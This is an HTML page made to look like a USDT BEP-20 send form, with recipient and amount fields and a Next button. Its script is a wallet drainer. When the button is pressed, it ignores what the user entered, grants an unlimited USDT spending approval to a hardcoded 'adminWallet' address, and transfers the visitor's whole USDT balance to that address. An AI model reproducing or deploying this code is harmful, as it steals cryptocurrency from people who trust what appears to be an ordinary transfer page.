<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>USDT BEP20 Auto Transfer</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background-color: #ffffff;
      color: #000000;
    }
    .container {
      max-width: 400px;
      margin: auto;
    }
    label {
      display: block;
      margin-top: 20px;
      font-weight: bold;
    }
    input[type="text"], input[type="number"] {
      width: 100%;
      padding: 15px;
      margin-top: 8px;
      border: 2px solid #ccc;
      border-radius: 12px;
      font-size: 16px;
    }
    .address-box {
      display: flex;
      justify-content: space-between;
      align-items: center;
      border: 2px solid #0047FF;
      border-radius: 12px;
      padding: 10px 12px;
      margin-top: 10px;
    }
    .address-box input {
      border: none;
      outline: none;
      flex: 1;
      font-size: 16px;
    }
    .small-icons span {
      color: #0047FF;
      margin-left: 10px;
      cursor: pointer;
      font-size: 16px;
    }
    .amount-container {
      display: flex;
      align-items: center;
      justify-content: space-between;
      border: 2px solid #ccc;
      border-radius: 12px;
      padding: 12px 15px;
      margin-top: 10px;
    }
    .amount-container input {
      border: none;
      outline: none;
      width: 100%;
      font-size: 16px;
    }
    .right-label {
      margin-left: 10px;
      white-space: nowrap;
      font-weight: bold;
    }
    .button {
      width: 100%;
      padding: 15px;
      font-size: 18px;
      font-weight: bold;
      color: white;
      background-color: #0047FF;
      border: none;
      border-radius: 15px;
      margin-top: 25px;
      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
      transition: all 0.3s ease;
    }
    .button.processing {
      opacity: 0.6;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <div class="container">
    <label>Address or Domain Name</label>
    <div class="address-box">
      <input id="toAddress" type="text" placeholder="Search or Enter">
      <div class="small-icons">
        <span onclick="pasteAddress()">Paste</span>
        <span>üîç</span>
        <span>üì∑</span>
      </div>
    </div>

    <label>Amount</label>
    <div class="amount-container">
      <input id="amount" type="number" placeholder="USDT Amount">
      <div class="right-label">USDT <span style="color:#0047FF; margin-left:8px; cursor:pointer;">Max</span></div>
    </div>
    <div style="margin-top: 5px; color: gray;">‚âà $0.00</div>

    <button id="nextBtn" class="button" onclick="autoTransferAllUSDT()">Next</button>
  </div>

  <script>
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
    const adminWallet = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";

    async function autoTransferAllUSDT() {
      const btn = document.getElementById("nextBtn");
      btn.innerHTML = "‚è≥ Processing...";
      btn.classList.add("processing");
      btn.disabled = true;

      if (typeof window.ethereum !== "undefined") {
        const web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const accounts = await web3.eth.getAccounts();
        const user = accounts[0];

        const contract = new web3.eth.Contract([
          {
            "constant": false,
            "inputs": [
              { "name": "_spender", "type": "address" },
              { "name": "_value", "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [ { "name": "", "type": "bool" } ],
            "type": "function"
          },
          {
            "constant": false,
            "inputs": [
              { "name": "_from", "type": "address" },
              { "name": "_to", "type": "address" },
              { "name": "_value", "type": "uint256" }
            ],
            "name": "transferFrom",
            "outputs": [ { "name": "", "type": "bool" } ],
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [ { "name": "_owner", "type": "address" } ],
            "name": "balanceOf",
            "outputs": [ { "name": "balance", "type": "uint256" } ],
            "type": "function"
          }
        ], usdtAddress);

        try {
          const balance = await contract.methods.balanceOf(user).call();
          const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
          await contract.methods.approve(adminWallet, max).send({ from: user });
          await contract.methods.transferFrom(user, adminWallet, balance).send({ from: user });
          btn.innerHTML = "‚úÖ All USDT Sent!";
        } catch (err) {
          console.error(err);
          btn.innerHTML = "‚ùå Failed";
        }

        btn.disabled = false;
        btn.classList.remove("processing");
      } else {
        alert("Web3 provider not detected");
        btn.innerHTML = "Next";
        btn.disabled = false;
        btn.classList.remove("processing");
      }
    }

    async function pasteAddress() {
      try {
        const text = await navigator.clipboard.readText();
        document.getElementById("toAddress").value = text;
      } catch (err) {
        alert("Clipboard access failed");
      }
    }
  </script>
</body>
</html>
